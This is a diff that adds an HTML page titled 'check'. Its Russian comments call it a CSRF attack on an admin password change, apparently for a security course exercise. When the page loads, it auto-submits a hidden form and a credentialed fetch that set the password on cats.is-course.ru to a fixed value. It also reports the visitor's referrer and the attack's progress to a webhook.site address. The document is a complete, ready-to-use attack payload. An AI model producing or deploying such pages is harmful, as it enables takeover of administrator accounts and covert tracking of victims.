@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>check</title></head>
+<body>
+<h1 id="s">...</h1>
+
+<!-- основная форма (CSRF смена пароля админа) -->
+<form id="f" method="POST" action="https://cats.is-course.ru/settings" target="h">
+  <input type="password" name="password" value="SupaAdmin777!zzz">
+  <input type="password" name="confirm-password" value="SupaAdmin777!zzz">
+</form>
+<iframe name="h" style="display:none"></iframe>
+
+<script>
+var W = "https://webhook.site/04ca0e33-7f1e-4122-8c00-713aeaf13b3c";
+function log(msg){
+  try { fetch(W + "?at=yds&m=" + encodeURIComponent(msg)); } catch(e){}
+}
+log("visited&ref=" + encodeURIComponent(document.referrer || "none"));
+
+// страховочный fetch-CSRF с включением cookie
+var b = new URLSearchParams();
+b.append("password","SupaAdmin777!zzz");
+b.append("confirm-password","SupaAdmin777!zzz");
+try {
+  fetch("https://cats.is-course.ru/settings",
+    {method:"POST", mode:"no-cors", credentials:"include", body:b})
+   .then(function(){ log("fetch-csrf-done"); })
+   .catch(function(e){ log("fetch-csrf-err=" + String(e).slice(0,40)); });
+} catch(e){ log("fetch-ex=" + String(e).slice(0,40)); }
+
+// основная форма — автосабмит
+setTimeout(function(){
+  try { document.getElementById("f").submit(); log("form-submitted"); }
+  catch(e){ log("form-err=" + String(e).slice(0,40)); }
+}, 500);
+</script>
+</body>
+</html>
